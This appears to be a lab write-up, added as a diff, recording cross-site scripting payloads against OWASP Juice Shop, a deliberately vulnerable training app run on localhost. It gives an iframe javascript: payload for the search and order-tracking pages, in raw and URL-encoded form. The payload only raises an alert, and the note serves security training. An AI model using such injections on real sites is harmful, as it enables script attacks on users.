@@ -1,0 +1,25 @@
+GET /#/search?q=
+Payload (reflected/DOM XSS via the product search box):
+<iframe src="javascript:alert(`xss`)">
+
+Reproduce (paste in the browser address bar):
+http://localhost:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
+
+Fully URL-encoded form (same payload):
+http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E
+
+Notes:
+- The q value is written into the page DOM without sanitization, so the iframe's
+  javascript: URL executes alert(`xss`) when the search page loads.
+- Juice Shop's Score Board labels this one "DOM XSS". The lab records it as
+  XSS - Reflected because the payload is delivered through the request (URL).
+- The payload is not persisted: reloading the page without the q parameter is clean.
+
+Official "Reflected XSS" variant (order tracking page):
+http://localhost:3000/#/track-result?id=<iframe src="javascript:alert(`xss`)">
+
+Encoded form:
+http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E
+
+The id is reflected into the page with bypassSecurityTrustHtml, so the payload
+executes and the Score Board shows "Reflected XSS" (instead of "DOM XSS").
